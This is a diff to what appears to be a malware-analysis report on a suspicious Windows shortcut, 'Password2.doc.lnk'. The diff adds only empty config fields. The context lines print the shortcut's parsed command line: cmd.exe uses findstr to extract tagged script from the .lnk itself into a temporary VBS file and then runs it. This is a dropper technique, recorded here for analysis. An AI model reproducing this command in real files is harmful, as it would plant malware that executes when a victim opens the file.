@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [0.8830851987937751, 3.5521550301189357, 1.574472824997899, 1.9843564025757072, 1.6257571130351642, 2.9207539573403514, 3.2232020836844644, 3.3820898634234204, 3.2463399169312597, 3.9576857155071288, 3.137229490402084, 3.403626242900228, 4.435495760110752, 4.843270064350634, 4.071435778360339, 4.510155972425143, 4.265430593415239, 3.7448438969051194, 3.634156882087254, 4.3655039443378225, 5.320299150663647, 5.360559817445699, 5.431826190351651, 5.2451595236849835, 5.26829735693178, 5.368427690322805, 5.0036144850034745, 5.35182619035165, 5.250364317359161, 4.921975110917953, 4.716658767278529, 5.088167023540753, 4.741844777526926, 5.161630690265112, 4.861239690092036, 4.657505738069692, 5.0577214382053866, 4.619908150490571, 4.561174719647027, 4.775913531686176, 4.866444483766211, 5.004946024604939, 4.9390979444532075, 5.024768523511906, 4.572645365048355, 4.382357730613452, 4.888772110975644, 4.8964446800167165, 5.148902444366671, 4.382935312768024]}}",
+        "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,7 @@
       {
         "auto_collapse": false,
         "body": "{\"flags\": \"IDList, RelativePath, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"(none)\", \"icon_index\": 134, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"relative_path\": \"..\\\\..\\\\Windows\\\\system32\\\\cmd.exe\", \"command_line_arguments\": \"/v:on /c findstr \\\"rSIPPswjwCtKoZy.*\\\" Password2.doc.lnk > \\\"%tmp%\\\\VEuIqlISMa.vbs\\\" & \\\"%tmp%\\\\VEuIqlISMa.vbs\\\"\", \"icon_file_name\": \"shell32.dll\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 0,
@@ -28,6 +30,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -55,6 +58,7 @@
       {
         "auto_collapse": false,
         "body": "{\"icon_location\": \"shell32.dll\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
@@ -73,6 +77,7 @@
       {
         "auto_collapse": false,
         "body": "{\"relative_path\": \"..\\\\..\\\\Windows\\\\system32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\system32\\\\cmd.exe\"}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
@@ -91,6 +96,7 @@
       {
         "auto_collapse": false,
         "body": "{\"Length\": 2848}",
+        "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
         "depth": 1,
